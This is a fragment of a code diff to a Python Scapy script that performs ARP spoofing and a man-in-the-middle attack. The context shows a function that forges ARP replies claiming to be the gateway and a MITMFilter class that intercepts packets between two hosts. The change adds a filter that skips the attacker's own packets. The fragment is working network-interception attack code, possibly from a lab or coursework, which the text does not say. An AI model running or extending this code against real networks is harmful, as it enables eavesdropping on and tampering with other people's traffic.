@@ -10,13 +10,16 @@ def arp_spoof_packet(target_ip, gateway_ip):
     return Ether(dst = target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac) # send to target_ip that we are the gateway
 
 class MITMFilter(Drain):
-    def __init__(self, ip_a, ip_b, mac_a, mac_b):
+    def __init__(self, ip_a, ip_b, mac_a, mac_b, mac_host):
         Drain.__init__(self, name=None)
         self.ip_a = ip_a
         self.ip_b = ip_b
         self.mac_a = mac_a
         self.mac_b = mac_b
+        self.mac_host = mac_host
     def push(self, msg):
+        if not msg.haslayer(Ether) or msg[Ether].src == self.mac_host:
+            return # ignore packets from the host itself
         print(f"MITMFilter: {msg.show()}")
         if msg.haslayer(IP):
             if msg[IP].src == self.ip_a and msg[IP].dst == self.ip_b:
